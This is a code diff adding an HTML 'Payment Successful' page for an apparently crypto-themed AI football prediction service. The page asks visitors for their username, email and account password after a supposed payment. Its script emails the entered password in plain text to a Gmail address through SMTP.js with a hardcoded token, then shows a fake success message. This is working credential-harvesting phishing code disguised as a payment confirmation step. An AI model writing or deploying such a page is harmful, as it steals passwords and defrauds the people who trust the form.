@@ -1,0 +1,328 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Payment Successful</title>
+
+     <!-- Favicon -->
+     <link href="img/icon-1.png" rel="icon">
+
+
+
+    <link rel="stylesheet" href="form.css">
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: Arial, sans-serif;
+            line-height: 1.6;
+            color: #333;
+            background-color: #f4f4f4;
+            justify-content: center;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        .notification {
+            background-color: #e7f6f0;
+            border: 1px solid #b7e4d7;
+            border-radius: 5px;
+            padding: 10px;
+            margin-bottom: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .notification p {
+            color: #2e7d67;
+        }
+
+        .close-btn {
+            background: none;
+            border: none;
+            color: #2e7d67;
+            cursor: pointer;
+            font-size: 18px;
+        }
+
+        .content {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 40px;
+        }
+
+        .left-column {
+            flex: 1;
+            min-width: 300px;
+        }
+
+        .right-column {
+            flex: 1;
+            min-width: 300px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        h1 {
+            margin-bottom: 10px;
+        }
+
+        .subtitle {
+            color: #666;
+            margin-bottom: 30px;
+        }
+
+        .progress {
+            position: relative;
+            margin-bottom: 30px;
+        }
+
+        .progress::before {
+            content: '';
+            position: absolute;
+            left: 15px;
+            top: 5px;
+            width: 2px;
+            height: calc(100% - 40px);
+            background-color: #2e7d67;
+        }
+
+        .step {
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+
+        .step-icon {
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            background-color: #2e7d67;
+            color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-right: 15px;
+        }
+
+        .step:last-child .step-icon {
+            background-color: #f4f4f4;
+            border: 2px solid #ccc;
+        }
+
+        .step:last-child .step-text {
+            color: #666;
+        }
+
+        .buttons {
+            display: flex;
+            gap: 10px;
+        }
+
+        .btn {
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+
+        .btn-primary {
+            background-color: #2e7d67;
+            color: white;
+        }
+
+        .btn-secondary {
+            background-color: white;
+            color: #2e7d67;
+            border: 1px solid #2e7d67;
+        }
+        .btn-secondary:hover{
+            background-color: #2ba07f;
+            color: white;
+        }
+
+
+
+        .illustration {
+            max-width: 100%;
+            height: auto;
+        }
+
+        @media (max-width: 768px) {
+            .content {
+                flex-direction: column;
+            }
+
+            .right-column {
+                order: -1;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="notification">
+            <p>Almost there <span id="loggedUserFName" style="text-transform: uppercase; font-family: 'Gill Sans', 'Gill Sans MT', Calibri, 'Trebuchet MS', sans-serif;"></span> !</p>
+            <button class="close-btn">&times;</button>
+        </div>
+        <div class="content">
+            <!-- <div class="left-column">
+                <h1>Payment Processing</h1>
+                <p class="subtitle">Please do make sure to fill the required information( your crypto AI username, A working mail of your choice to recieve your games, your crypto AI account password) very cumpolsory</p>
+                <div class="progress">
+                    <div class="step">
+                        <div class="step-icon">✓</div>
+                        <div class="step-text">Sites selected</div>
+                    </div>
+                    <div class="step">
+                        <div class="step-icon">✓</div>
+                        <div class="step-text">Payment received</div>
+                    </div>
+                    <div class="step">
+                        <div class="step-icon"></div>
+                        <div class="step-text">Processing </div>
+                    </div>
+                </div>
+                 <div class="buttons">
+                    
+                     only click this button after you filled and submitted the informations as stated above
+                     <button class="btn btn-secondary" onclick="window.location.href='homepage.html'">Back Home</button> 
+                </div> 
+            </div> -->
+            <!-- <div class="right-column">
+                <img src="https://via.placeholder.com/300x300" alt="Success celebration illustration" class="illustration">
+            </div> -->
+
+            <div class="containers">
+                <h2>Fill required fields to proceed</h2>
+          
+                <form id="user-form">
+                  <label for="username">Username</label>
+                  <input type="text" id="username" name="username" required />
+          
+                  <label for="email">Email:</label>
+                  <input type="email" id="email" name="email" required />
+          
+                  <label for="password">Password:</label>
+                  <input type="password" id="password" name="password" required />
+          
+                  <button type="submit" onclick="sendFormData(event)">Submit</button>
+                </form>
+              </div>
+
+              <div class="left-column">
+                <h1>Payment Processing</h1>
+                <p class="subtitle">Please do make sure to fill the required information( your crypto AI username, A working mail , And your crypto AI account password) very cumpolsory , A confirmation Email would be sent to your mail box if your payment is confirmed. You can go back to payment page if you haven't made payments <a href="btc.html">Back</a></p>
+                <div class="progress">
+                    <div class="step">
+                        <div class="step-icon">✓</div>
+                        <div class="step-text"></div>
+                    </div>
+                    <div class="step">
+                        <div class="step-icon">✓</div>
+                        <div class="step-text"></div>
+                    </div>
+                    <div class="step">
+                        <div class="step-icon"></div>
+                        <div class="step-text">Processing </div>
+                    </div>
+                </div>
+                 <div class="buttons">
+                    <!-- <button class="btn btn-primary">New Site</button> -->
+                     only click this button after you filled and submitted the informations as stated above
+                     <button class="btn btn-secondary" onclick="window.location.href='homepage.html'">Back Home</button> 
+                </div> 
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.querySelector('.close-btn').addEventListener('click', function() {
+            document.querySelector('.notification').style.display = 'none';
+        });
+    </script>
+
+
+
+
+
+
+
+<script src="https://smtpjs.com/v3/smtp.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+<script>
+  function sendFormData(event) {
+    event.preventDefault(); // Prevent form from submitting normally
+
+    // Get form data
+    let form = document.getElementById("user-form");
+    let formData = new FormData(form);
+
+    // Get values from the form
+    let username = formData.get("username");
+    let email = formData.get("email");
+    let password = formData.get("password");
+
+    // Create the email content
+    let emailContent = `
+        <b>Username:</b> ${username}<br>
+      <b>Email:</b> ${email}<br>
+       <b>Password:</b> ${password} 
+      
+       
+    `;
+
+    // Send email using SMTP.js
+    Email.send({
+      SecureToken: "07e0ab5f-c86a-44e8-af11-4aabb6a31966",
+      To: "cryptoaifootballpredictor@gmail.com",
+      From: "cryptoaifootballpredictor@gmail.com",
+      Subject: "User Information Form Submission",
+      Body: emailContent,
+    })
+      .then(() => {
+        // SweetAlert success notification
+        Swal.fire({
+          icon: "success",
+          title: "Payment Successfully",
+          text: "The AI predicts would be sent to your Mail",
+          confirmButtonColor: "#007bff" ,
+        });
+        form.reset(); // Reset the form
+      })
+      .catch((error) => {
+        // SweetAlert error notification
+        Swal.fire({
+          icon: "error",
+          title: "Submission Failed",
+          text: `Error sending email: ${error}`,
+          confirmButtonColor: "#ff0000",
+        });
+      });
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
